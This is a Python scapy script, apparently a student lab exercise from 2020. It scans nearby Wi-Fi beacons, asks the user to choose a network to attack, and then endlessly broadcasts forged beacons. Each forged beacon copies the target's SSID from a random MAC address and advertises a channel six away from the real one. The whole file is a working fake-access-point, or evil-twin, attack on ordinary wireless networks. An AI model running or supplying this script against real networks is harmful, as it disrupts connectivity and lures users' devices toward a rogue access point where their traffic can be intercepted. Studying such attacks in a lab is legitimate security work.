# Python 3.7.6
#
# Auteurs: Adrien Barth, Lionel Burgbacher
# Date:    02.03.2020
# Source:  https://gist.github.com/securitytube/5291959
#          https://www.thepythoncode.com/article/create-fake-access-points-scapy
#
# Description:
#
#
#
#
import argparse
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap
from prettytable import PrettyTable

parser = argparse.ArgumentParser(description='Fake chanel script')

parser.add_argument("-i", "--interface", default="wlan0mon", help="Interface you want to attack")
args = parser.parse_args()

ap_list = []
addr = []

def packethandler(pkt):

    if pkt.haslayer(Dot11Beacon):
        if pkt.addr2 not in addr:
            ap_list.append(pkt)
            addr.append(pkt.addr2)


print("In progress...")
sniff(iface=args.interface, prn=packethandler, timeout=5)

table = PrettyTable()
table.title = 'List SSID'
for index,ssid in enumerate(ap_list):
    table.field_names = ['Index', 'SSID', 'Channel', 'Signal']
    table.add_row([str(index), str(ssid.info.decode()), str(ssid[Dot11Beacon].network_stats().get("channel")), str(ssid.dBm_AntSignal) +' dBm'])

print(table)
target = int(input("\nChoose the index of the SSID you want to attack: "))

print("\nYou choose to attack : " + str(ap_list[target].info.decode()))

channel = ap_list[target][Dot11Beacon].network_stats().get("channel")
new_channel = channel + 6 if channel <= 6 else channel - 6

sender_mac = RandMAC()
ssid = ap_list[target].info.decode()
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
beacon = Dot11Beacon(cap="ESS+privacy")
essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
dsset = Dot11Elt(ID="DSset", info=chr(new_channel))
frame = RadioTap()/dot11/beacon/essid/dsset
sendp(frame, inter=0.1, iface=args.interface, loop=1)
